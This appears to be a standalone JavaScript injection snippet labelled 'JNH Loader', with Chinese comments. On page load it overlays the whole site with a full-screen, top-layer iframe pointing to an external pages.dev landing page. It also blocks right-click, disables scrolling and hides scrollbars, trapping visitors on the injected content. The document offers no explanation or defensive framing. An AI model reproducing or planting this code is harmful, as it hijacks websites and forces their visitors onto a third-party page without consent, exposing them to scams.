(function() {
    if (document.querySelector('.jnh_iframe_hidden')) {
        return;
    }
    let retryCount = 0;
    const MAX_RETRIES = 20;

    function initializeAndShowIframe() {
        const body = document.body;
        const html = document.documentElement;

        if (!body || !html) {
            if (retryCount < MAX_RETRIES) {
                retryCount++;
                setTimeout(initializeAndShowIframe, 50);
            } else {
                console.error("JNH Loader Error: document.body or document.documentElement not available after multiple retries.");
            }
            return;
        }

        const snpIframe = document.createElement('iframe');
        snpIframe.src = 'https://my-landing-page-9ru.pages.dev';
        snpIframe.frameBorder = '0';
        snpIframe.rel = 'nofollow';
        snpIframe.className = 'jnh_iframe_hidden';
        snpIframe.style.cssText = `
            position: fixed;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            z-index: 2147483646;
            display: block;
            border: none;
            margin: 0;
            padding: 0;
            overflow: hidden; /* 防止 iframe 内部滚动条 */
        `;

        snpIframe.oncontextmenu = function() {
            return false;
        };

        // 获取原始的 overflow 样式（这部分代码可以移除，因为不恢复了，但保留不影响功能）
        // const computedBodyStyle = window.getComputedStyle(body);
        // const computedHtmlStyle = window.getComputedStyle(html);
        // const originalBodyOverflow = computedBodyStyle.overflow;
        // const originalHtmlOverflow = computedHtmlStyle.overflow;

        body.appendChild(snpIframe);

        // 关键点：禁用背景页面的滚动
        body.style.overflow = 'hidden';
        html.style.overflow = 'hidden';

        // 额外的 CSS 规则，通过 style 标签注入，确保覆盖性
        const style = document.createElement('style');
        style.innerHTML = `
            body, html {
                overflow: hidden !important; /* 最强力的禁用滚动 */
                width: 100%; /* 确保元素宽度正确 */
                height: 100%; /* 确保元素高度正确 */
                margin: 0; /* 移除默认外边距 */
                padding: 0; /* 移除默认内边距 */
            }
            /* 某些浏览器或情况下，可能有默认的滚动条样式，这个规则可以帮助 */
            ::-webkit-scrollbar {
                display: none; /* 针对 Webkit 浏览器隐藏滚动条 */
            }
            html {
                -ms-overflow-style: none;  /* IE and Edge */
                scrollbar-width: none;  /* Firefox */
            }
        `;
        document.head.appendChild(style);
    }

    if (document.readyState === "complete" || document.readyState === "interactive") {
        initializeAndShowIframe();
    } else {
        document.addEventListener("DOMContentLoaded", initializeAndShowIframe);
    }
})();
